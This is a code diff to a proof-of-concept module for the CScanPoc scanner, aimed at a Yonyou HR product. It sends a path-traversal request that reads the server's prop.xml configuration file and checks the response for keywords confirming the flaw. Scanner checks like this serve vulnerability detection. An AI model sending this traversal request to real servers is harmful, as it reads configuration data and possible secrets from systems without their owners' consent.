@@ -1,5 +1,5 @@
 # coding: utf-8
-
+import re
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
@@ -15,7 +15,7 @@ class Vuln(ABVuln):
     ref = 'Unknown'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = '用友'  # 漏洞应用名称
+    product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 class Poc(ABPoc):
@@ -37,7 +37,7 @@ class Poc(ABPoc):
             code, head, res, errcode, _ = hh.http(url + '/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
             #print res
             if code == 200:
-                security_hole(url + '/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
+                # security_hole(url + '/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
                 m = re.search("enableHotDeploy", res) 
                 k = re.search("internalServiceArray", res)
                 if m and k:
